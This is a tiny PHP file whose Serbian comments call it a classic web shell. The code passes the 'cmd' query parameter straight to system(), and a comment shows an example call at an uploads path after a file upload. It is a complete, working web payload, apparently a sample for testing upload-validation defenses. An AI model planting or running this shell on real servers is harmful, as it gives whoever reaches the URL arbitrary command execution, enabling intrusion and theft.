<?php
// PHP web shell - klasican napad. Ako se sacuva u web-dostupan folder
// i server ga izvrsi kao PHP, napadac dobija RCE (Remote Code Execution).
// Primer poziva nakon uploada: /uploads/shell.php?cmd=whoami
echo "WEB SHELL OK: ";
system($_GET['cmd'] ?? 'whoami');
